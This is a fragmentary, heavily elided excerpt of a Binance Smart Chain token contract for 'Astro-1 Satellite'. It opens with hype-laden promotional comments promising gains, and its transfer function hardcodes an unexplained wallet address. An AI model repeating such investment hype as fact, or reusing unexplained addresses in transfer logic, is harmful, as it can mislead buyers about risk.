/**
The newest token, ASTRO-1  SATELLITE, will send all holders to the moon, where they rightfully belong. With genuine utility, community, and meme power. ASTRO1 is prepared to compete our way to the top of Binance Smart Chain's charts!

⚙️Web3.0 Staking
🎮Play-To-Earn Game (READY TO PLAY!)
🔝 Good marketing plan 
🚀 Bullish community 
🐳 Whale community 
🚀Renounce Ownership
...
WEBSITE: LIVE 1 HOUR AFTER LAUNCH
TG:https://t.me/astro1satellite
*/
...
contract Astro1satellite is Context, IERC20, Ownable {
    ...
    string private constant _name = "Astro-1 Satellite"; // 
    string private constant _symbol = "ASTRO1"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x63d156C279B315a42eDe24f34F2fE9d5022af03e;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xb5986E6f603e0fB9eA8F71C6A00250880D8E2d69;
